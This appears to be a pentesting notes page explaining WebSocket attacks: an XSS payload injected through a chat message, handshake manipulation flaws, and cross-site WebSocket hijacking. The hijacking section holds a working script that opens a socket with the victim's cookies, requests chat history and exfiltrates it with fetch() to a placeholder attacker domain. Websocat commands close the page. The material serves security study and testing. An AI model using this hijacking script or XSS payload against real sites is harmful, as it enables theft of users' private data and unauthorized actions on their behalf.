# Websockets

Sockets in web development refer to communication endpoints that allow bidirectional data flow between a client and a server in real-time, enabling dynamic and interactive web applications.

### Table of Content

- [Manipulating WebSocket messages](#manipulating-websocket-messages-to-exploit-vulnerabilities)
- [Manipulating the WebSocket handshake](#manipulating-the-websocket-handshake-to-exploit-vulnerabilities)
- [Using cross-site WebSockets hijacking](#using-cross-site-websockets)
- [Linux cmd](#linux-command)

## Manipulating WebSocket messages to exploit vulnerabilities

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

```json
{"message":"Hello Carlos"}
```

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

```html
<td>Hello Carlos</td>
```

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

```html
{"message":"<img src=1 onerror='alert(1)'>"}
```

## Manipulating the WebSocket handshake to exploit vulnerabilities

Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

## Using cross-site WebSockets hijacking

Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

Note:

*The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.*

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:

- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.

For example the websocket server sends back the history of the conversation of a user if a msg with "READY" is sent, then a simple XSS establishing the connection (the cookie will be sent automatically to authorise the victim user) sending "READY" will be able to retrieve the history of the conversation.:

```html
<script>
    websocket = new WebSocket('wss://your-websocket-URL')
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event) {
    websocket.send("READY"); //Send the message to retreive confidential information
    }
    function handleReply(event) {
    //Exfiltrate the confidential information to attackers server
    fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
    }
</script>
```

## linux command

You can use websocat to establish a raw connection with a websocket.

```sh
websocat --insecure wss://10.10.10.10:8000 -v
```
Or to create a websocat server:

```sh
websocat -s 0.0.0.0:8000 #Listen in port 8000
```

---

[**:arrow_right_hook: Back home**](/README.md)